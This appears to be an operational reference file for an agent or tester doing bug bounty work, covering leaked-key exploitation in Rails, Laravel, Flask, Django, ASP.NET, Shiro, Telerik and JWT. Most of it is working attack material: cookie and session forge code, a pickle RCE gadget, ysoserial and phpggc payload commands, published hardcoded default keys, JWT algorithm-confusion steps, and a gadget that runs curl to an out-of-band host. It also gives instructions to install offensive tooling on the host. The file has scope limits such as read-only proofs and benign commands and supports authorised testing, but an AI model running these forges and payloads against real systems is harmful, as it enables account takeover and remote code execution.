# Leaked-Key -> Forge Ladder

The highest-converting deserialization path: a signing/encryption key is exposed
(JS bundle, `.env`, debug page, source map, GitHub, `credentials.yml.enc`) OR a
documented hardcoded default applies. **Forging the token with that key IS the
exploit** — do not hand a leaked signing key to `exposed-secrets` and stop. Only
**online brute-forcing of an UNKNOWN key** against prod is banned; cracking your
OWN token offline is fine.

Resolve the key against `../../_shared/references/public-by-default-keys.md` first
— a signing/encryption key (APP_KEY, SECRET_KEY, machineKey, secret_key_base) is
always PURSUE.

## Contents
- Rails — `secret_key_base` -> cookie forge -> Marshal RCE
- Laravel — `APP_KEY` -> encrypted cookie -> phpggc RCE (CVE-2018-15133)
- Flask — `SECRET_KEY` -> session forge (-> pickle RCE)
- Django — `SECRET_KEY` -> signed session (-> PickleSerializer RCE)
- ASP.NET — `machineKey` -> `__VIEWSTATE` forge -> RCE (CVE-2020-0688)
- Shiro — rememberMe -> default-key AES -> RCE (CVE-2016-4437, SHIRO-550)
- Telerik UI — RadAsyncUpload -> deser RCE (CVE-2019-18935)
- JWT — leaked/weak HMAC secret or algorithm confusion
- Universal discipline

---

## Rails — `secret_key_base` -> cookie forge -> Marshal RCE

**Where it leaks:** `config/credentials.yml.enc` + `master.key` in a repo,
`config/secrets.yml`, `SECRET_KEY_BASE` env in a debug/error page, or the Rails
dev-mode default (`CVE-2019-5420`, Rails < 5.2.2.1 and < 6.0.0.beta3,
development mode only: predictable dev secret). Note 5.2.0/5.2.1/5.2.2 and the
6.0.0.beta1/beta2 line are vulnerable — do not read the gate as "< 5.2".

**Cookie mechanics:** Rails signs (and, >= 4.1, encrypts) `_<app>_session` with a
key derived from `secret_key_base`. With the key you can decrypt and re-forge.

**Impact:**
- Forge any session (set `user_id`, `admin: true`) → ATO / privesc (rung-2, your
  own target account first, then inference to any user).
- If the cookie serializer is `:marshal` (Rails < 4.1 default, or configured) →
  embed a Ruby universal deserialization gadget → **RCE**.
- `CVE-2020-8165`: `Marshal.load` of untrusted cache/`raw` values → RCE.

**Forge:**
```ruby
# ActiveSupport 5/6/7 encrypted+signed cookie
require 'active_support'
key   = ActiveSupport::KeyGenerator.new(secret_key_base).generate_key(
          'authenticated encrypted cookie', 32)
enc   = ActiveSupport::MessageEncryptor.new(key, cipher: 'aes-256-gcm',
          serializer: Marshal)
cookie = enc.encrypt_and_sign({ 'user_id' => 1, 'admin' => true })
```
Tooling: `rails-doubletap` / `rails_secret_deserialization` automates the Marshal
gadget path; neither is installed here, and the snippet above needs the gem
(`ruby` is present — `gem install activesupport`). Confirm read-only first: forge a
session for YOUR account, request `/me` (or equivalent), see it authenticated. Then
escalate.

---

## Laravel — `APP_KEY` -> encrypted cookie -> phpggc RCE (CVE-2018-15133)

**Where it leaks:** `.env` file disclosure, `APP_DEBUG=true` Ignition/Whoops error
page (leaks env incl `APP_KEY`), GitHub, backup files. `APP_KEY` looks like
`base64:....` (32 bytes).

**Mechanics:** Laravel encrypts+MACs cookies with `APP_KEY` (AES-256-CBC/GCM). The
`Illuminate\Cookie\Middleware` decrypts and **`unserialize()`s** the payload → PHP
object injection. Chain a phpggc gadget for the framework version → RCE.

**Forge + gadget:**

> **Tooling:** `phpggc` is **not installed on this host**. Install it first — `git clone https://github.com/ambionics/phpggc ~/tools/phpggc` — or use the alternative below. Do not silently skip the proof step; a skipped proof is a lost finding.
>
> `php` and `python3` are present, so the AES-CBC/GCM encrypt-then-MAC half needs no
> extra tool once the gadget bytes exist. Decrypting a captured cookie with a leaked
> `APP_KEY` — which alone proves the key is live — is ~15 lines of `python3` and
> needs nothing cloned.

```bash
# build the object-injection payload
~/tools/phpggc/phpggc Laravel/RCE9 system 'id' -b   # base64 gadget for the value
# then AES-encrypt+MAC it under APP_KEY and set as X-XSRF-TOKEN / cookie
```
Tooling: `laravel-crypto-killer.py` (encrypt/decrypt/forge with `APP_KEY`, also not
installed — `git clone https://github.com/synacktiv/laravel-crypto-killer ~/tools/laravel-crypto-killer`)
chained with `phpggc`. Also test `X-XSRF-TOKEN` header and `laravel_session`.

**Impact:** unauth RCE if the decrypt path is reachable pre-auth; benign `id`
output is the proof. Also relevant: `CVE-2024-55555` / the mass-`APP_KEY`-leak
research — thousands of live keys. If you only have the key, forging the encrypted
cookie is still ATO even when the gadget is patched.

---

## Flask — `SECRET_KEY` -> session forge (-> pickle RCE)

**Where it leaks:** `SECRET_KEY` in `settings.py`/`config.py` in a repo, a debug
page, or a weak value crackable offline.

**Decode / crack (own token) / sign:**
```bash
flask-unsign --decode --cookie 'eyJ...'                 # inspect claims
flask-unsign --unsign --cookie 'eyJ...' --wordlist keys.txt   # crack OWN token, offline
flask-unsign --sign --cookie "{'logged_in': True, 'is_admin': True}" \
             --secret '<leaked-or-cracked SECRET_KEY>'
```
`--wordlist` cracking is allowed **offline against your own captured cookie** — it
is not online brute-force against prod. Signing with the recovered/leaked key is
the exploit.

**Impact:**
- Default Flask session = signed JSON → forge → auth bypass / privesc.
- If the app uses a **pickle** session serializer (Flask-Session with
  `SESSION_SERIALIZER='pickle'`, old Flask-KVSession, or a custom
  `pickle.loads(session[...])`) → forge a pickle `__reduce__` gadget → **RCE**:
  ```python
  import pickle, os
  class E:
      def __reduce__(self): return (os.system, ('id',))
  # sign the pickle blob with flask-unsign using the leaked SECRET_KEY
  ```

---

## Django — `SECRET_KEY` -> signed session (-> PickleSerializer RCE)

**Where it leaks:** `SECRET_KEY` in `settings.py`, a `DEBUG=True` error page
(shows settings), or a repo.

**Mechanics:** `django.core.signing` signs sessions/tokens with `SECRET_KEY`. With
it you forge any signed value (session, password-reset token, `messages`).
- Default `JSONSerializer` → forge session → auth bypass / privesc.
- `SESSION_SERIALIZER='django.contrib.sessions.serializers.PickleSerializer'`
  (pre-1.6 default; still configurable) → pickle gadget → **RCE**.

**Forge:**
```python
from django.core import signing
signing.dumps({'_auth_user_id': '1', '_auth_user_backend': '...',
               '_auth_user_hash': '...'}, key=SECRET_KEY,
              salt='django.contrib.sessions.backends.signed_cookies')
```
Prove read-only first: forge a session for your own user id, confirm authenticated.

---

## ASP.NET — `machineKey` -> `__VIEWSTATE` forge -> RCE (CVE-2020-0688)

**Where it leaks / defaults:** `machineKey` (validationKey + decryptionKey) in a
disclosed `web.config`, source leak, or a **known static default** — most notably
Microsoft Exchange OWA/ECP shipped a hardcoded validationKey
`CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF` (CVE-2020-0688). A known/leaked
`machineKey` is the forge case, not a brute case.

**Oracle first:** corrupt the trailing MAC of a captured `__VIEWSTATE`. `500
Validation of viewstate MAC failed` → MAC enforced (need the key). Silent accept /
different error → `enableViewStateMac="false"` → forge with no key at all.

**Forge with ysoserial.net:**

> **Tooling:** `ysoserial.net` is **not installed on this host**, and neither is a .NET runtime (`dotnet`/`mono` both absent). Install it first — release zip from `https://github.com/pwntester/ysoserial.net/releases` into `~/tools/`, plus `sudo apt install -y mono-complete` to run it — or use the alternative below. Do not silently skip the proof step; a skipped proof is a lost finding.
>
> The **MAC oracle above needs nothing installed** and is itself a reportable fact:
> `enableViewStateMac="false"` (silent accept) proves an unauthenticated forge path
> exists on that endpoint. Get that with `curl` first, then install the toolchain to
> land the command.

```
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c nslookup <id>.oob" \
  --path="/owa/auth.owa" \
  --apppath="/" \
  --generator=<__VIEWSTATEGENERATOR value from the page> \
  --validationkey=CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF \
  --validationalg=SHA1 \
  --decryptionkey=<hex or omit if MAC-only> --decryptionalg=AES
```
Use a benign command (`nslookup <id>.oob`, `whoami`) — the OOB DNS hit or the
`whoami` reflection is the proof. This is unauth-to-authed RCE on Exchange; on
generic ASP.NET WebForms it is post-auth RCE wherever ViewState is accepted.

---

## Shiro — rememberMe -> default-key AES -> RCE (CVE-2016-4437, SHIRO-550)

**Fingerprint:** send `rememberMe=invalid`; response `Set-Cookie:
rememberMe=deleteMe` = Apache Shiro.

**Key:** the `rememberMe` cookie is `AES-CBC(base64key)` around a Java serialized
object. Shiro shipped the hardcoded default key
`kPH+bIxk5D2deZiIxcaaaA==`; hundreds more default keys are publicly catalogued.
Using a **known/leaked** key is the forge case.

**Forge:**

> **Tooling:** `ysoserial` is **not installed on this host**. Install it first — `curl -L -o ~/tools/ysoserial.jar https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar` — or use the alternative below. Do not silently skip the proof step; a skipped proof is a lost finding.
>
> `java` and `python3` are present, so step 2 needs no extra tool: `pipx install
> pycryptodome`, then AES-CBC-encrypt the gadget bytes in ~10 lines of `python3`.
> The `rememberMe=deleteMe` fingerprint itself is a plain `curl` and needs nothing.

```bash
# 1. build a Java gadget (pick by classpath)
java -jar ~/tools/ysoserial.jar CommonsBeanutils1 'curl http://<id>.oob' > payload.ser
# 2. AES-CBC encrypt payload.ser under the base64 key, prepend a random 16B IV,
#    base64 the (IV||ciphertext) -> rememberMe cookie value
```
Tooling: `shiro_attack_tool`, `ShiroExploit`. The gadget depends on the classpath
(CommonsBeanutils1 is common because shiro-core ships commons-beanutils). Prove
with an OOB callback (`curl`/`nslookup` to your listener) — that is the
non-destructive RCE proof. `CVE-2019-12422` (SHIRO-721) is the padding-oracle
variant when the key was rotated and you don't have it.

---

## Telerik UI — RadAsyncUpload -> deser RCE (CVE-2019-18935)

**Fingerprint:** `Telerik.Web.UI.WebResource.axd?type=rau` returns
`{ "message" : "RadAsyncUpload handler is registered..." }`.

**Key:** `Telerik.Web.UI.DialogParametersEncryptionKey` — a static default in old
versions (`CVE-2017-11317`) or a leaked value. With it, `rauPostData` deserializes
an attacker `Telerik.Web.UI.AsyncUploadConfiguration` -> upload a mixed-mode
assembly to a known path -> RCE (`CVE-2019-18935`).

**Tooling:** `RAU_crypto.py` (encrypt with the key) and `ysoserial.net` (serialized
config) are **both absent on this host** — `git clone https://github.com/bao7uo/RAU_crypto ~/tools/RAU_crypto`
plus the ysoserial.net install note in the ASP.NET section above. The `type=rau`
fingerprint and the benign metadata read that confirms the key are plain `curl` and
need nothing — do those first.

---

## JWT — leaked/weak HMAC secret or algorithm confusion

Not object deserialization, but the same "forge a signed blob" primitive and it
co-occurs with the cookie forges above.

> **Tooling:** `jwt_tool` is **not installed on this host**. Install it first — `git clone https://github.com/ticarpi/jwt_tool ~/tools/jwt_tool` — or use the alternative below. Do not silently skip the proof step; a skipped proof is a lost finding.
>
> Credential-free alternatives that need nothing: decode with
> `python3 -c "import sys,base64,json;p=sys.argv[1].split('.')[1];print(json.loads(base64.urlsafe_b64decode(p+'='*(-len(p)%4))))" '<token>'`,
> and mint an HS256 token with a known secret in three lines of `python3` (`hmac` +
> `hashlib` + base64url over `header.payload`). `alg:none` needs no tooling at all —
> rewrite the header, empty the signature, replay.

- **Leaked/weak HMAC secret:** `~/tools/jwt_tool/jwt_tool.py <token> -C -d wordlist.txt`
  or `hashcat -m 16500 token.txt wordlist` (`hashcat` is also absent —
  `sudo apt install -y hashcat`) — **offline, against your OWN token**. Sign admin
  claims with the recovered secret.
- **alg confusion RS256 -> HS256:** sign with the server's PUBLIC key as the HMAC
  secret (`~/tools/jwt_tool/jwt_tool.py <token> -X k -pk public.pem`). Forge without
  the private key.
- **`alg: none`:** strip the signature if the server accepts it.
- **`jku`/`x5u`/`kid` injection:** point `jku` to your JWKS, or `kid` to a
  predictable file / SQLi.

Forge `sub`/`role`/`tenant` to another user/admin. Prove read-only: forge, call
`/me`, confirm the identity flipped. Cracking is offline-own-token only.

The full JWT forgery ladder — every `kid`/`jku`/`x5u` variant, claim-vs-path
confusion, and the JWKS-hosting mechanics — is owned by
`../../auth-flow-bypass/references/jwt-attacks.md`. This file keeps the JWT case
only because it co-occurs with the cookie forges above.

---

## Universal discipline

1. Identify the key and its runtime; confirm the forge mechanism (sign vs
   encrypt+MAC vs AES-CBC).
2. **Rung 1** — forge a token for YOUR OWN identity, do a read-only call
   (`/me`, scope read-back, a DNS-only gadget). Proves the key is live and the
   forge works with zero blast radius.
3. **Rung 2-3** — one privesc (become admin) or one benign command (`id`). Never
   bulk-read other tenants.
4. **Rung 4** — full cross-tenant/RCE on UAT if RoE restricts prod.
5. Flag every key you touched for rotation in the report, then validate.
6. Dedup before you call it new: `rg -i '<primitive> <host>' ~/Desktop/skills/personal-corpus/h1/index.md ~/Desktop/skills/personal-corpus/bugcrowd/index.md`, and — when the program has one — its live ledger under `targets/<program>/reports/`, which wins over any stale export. A match on the same primitive + same host is CLOSED: rotate to the next angle.
